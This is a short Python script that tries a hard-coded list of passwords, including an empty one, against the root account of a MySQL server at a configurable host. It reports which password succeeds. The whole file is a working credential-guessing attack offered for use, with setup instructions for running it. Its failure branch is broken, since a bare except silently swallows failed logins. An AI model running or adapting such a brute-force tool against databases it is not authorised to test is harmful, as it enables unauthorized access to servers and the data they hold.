# Write in Command Prompt 'pip install pymysql'

import pymysql as sql

passwords = {'xdddd', 'elohere', 'melco123', '', 'loluwa'} # Here you give your passwords

host = '127.0.0.1' # Your host


def crack():
    for password in passwords:
        try:
            connection = sql.connect(host=host, unix_socket='', user='root', passwd=password, db='information_schema') # Connection
            if connection.open == True:
                if password == '':
                    print("This database doesn't have password")
                else:
                    print(f'Password {password} is correct!')
            else:
                print("All of passwords aren't correct!")
        except:
            pass

if __name__ == '__main__':
    crack()
    input()